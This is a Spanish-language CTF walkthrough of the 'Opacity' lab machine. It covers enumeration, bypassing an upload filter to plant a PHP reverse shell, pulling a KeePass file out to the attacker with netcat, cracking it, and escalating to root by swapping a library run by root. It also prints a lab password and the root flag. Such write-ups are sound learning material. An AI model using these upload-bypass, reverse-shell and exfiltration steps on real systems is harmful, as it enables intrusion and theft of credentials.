
Opacity is an easy machine that can help you in the penetration testing learning process.

There are 2 hash keys located on the machine (user - local.txt and root - proof.txt). Can you find them and become root?

_Hint: There are several ways to perform an action; always analyze the behavior of the application._

Realizamos un escaneo de puertos, esta vez vamos a usar [RustScan](https://github.com/RustScan/RustScan) 
![[Pasted image 20241230223241.png]]
el ssh tiene password, pero la pagina web es accesible, por lo que vamos a escanear posibles subdominios con gobuster

![[Pasted image 20241230224246.png]]

```bash
 $ gobuster dir -u 10.10.137.245 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,php3, html
```

con este segundo comando (tras haber descargado los diccionarios de dirbuster) nos muestra que hay un subdomino /cloud que nos permite subir archivos. 

![[Pasted image 20241231114020.png]]

si intentamos subir un archivo .php para realizar RCE nos va a negar la subida, debido a q no admite archivos que no tengan extensiones de imagen. Si probamos a subir el archivo con nombre test.php.jpg, podemos observar que si nos deja subirlo, pero a la hora de acceder a el no podemos ejecutar el codigo q lleva, para ello siguiendo los consejos de [HackTricks](https://book.hacktricks.xyz/pentesting-web/file-upload)podemos intentar modificar el nombre para que al realizar la solicitud GET solicite el archivo .php en vez de el php.jpg
![[Pasted image 20241231114507.png]]

tras probar, llegamos a la conclusion que si el nombre lleva un # despues del php conseguimos nuestro objetivo.

![[Pasted image 20241231114651.png]]

Ahora vamos a proceder a generar una shell, y para ello usamos [RevShell](https://www.revshells.com) y empezamos a escuchar con NetCat

![[Pasted image 20241231115317.png]]

Ahora si navegamos al archivo subido obtenemos una shell
`10.10.33.109/cloud/images/rs.php`
![[Pasted image 20241231120214.png]]
Ejecutamos `python3 -version` para obtener la version de python
![[Pasted image 20241231120341.png]]
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
asi obtenemos una shell mas completa
```
(cat /proc/version || uname -a ) 2>/dev/null
```
usando este comando obtenemos las versiones del kernel y del sistema operativo
```
Linux version 5.4.0-139-generic (buildd@lcy02-amd64-112) (gcc version 9.4.0 (Ubuntu 9.4.0-1ubuntu1~20.04.1)) #156-Ubuntu SMP Fri Jan 20 17:27:18 UTC 2023
```

* **Version Kernel:** 5.4.0
* **Version Ubuntu:** 20.04.1
* **Version GCC:** 9.4.0

Revisando los archivos del sistema podemos encontrar en /opt un archivo llamado dataset.kdbx, este podemos descargarlo usando [netcat](https://ironhackers.es/en/cheatsheet/transferir-archivos-post-explotacion-cheatsheet/)
Attacking machine command:
``` bash
nc -lvp 4444 > FiletoDownload
```

Victim Machine command:

``` bash
nc 192.168.1.35 4444 -w 3 < FiletoDownload
```

tras formatear el archivo a johntheripper y crackear la contraseña podemos obtener las credenciales de acceso de un [KeeWeb](https://app.keeweb.info/)
![[Pasted image 20241231131306.png]]

![[Pasted image 20241231131436.png]]
**User:** sysadmin
**Pass:** Cl0udP4ss40p4city#8700

En el directorio home de  Sysadmin tenemos la primera flag
![[Pasted image 20241231131738.png]] 
ademas de un directorio scripts![[Pasted image 20241231135249.png]]

Podemos ver que script.php carga una libreria `backup.inc.php` de /lib/ vamos a ver q hace ese archivo y si podemos modificarlo

![[Pasted image 20241231135159.png]]

borramos el archivo y subimos el nuestro con el mismo nombre con una reverse shell en su interior, usando esta vez un [servidor http](https://ironhackers.es/en/cheatsheet/transferir-archivos-post-explotacion-cheatsheet/)para transferir los archivos, una vez tenemos acceso al usuario root, accedemos a la carpeta /root y esta la segunda flag `proof.txt`
<u>ac0d56f93202dd57dcb2498c739fd20e</u> 
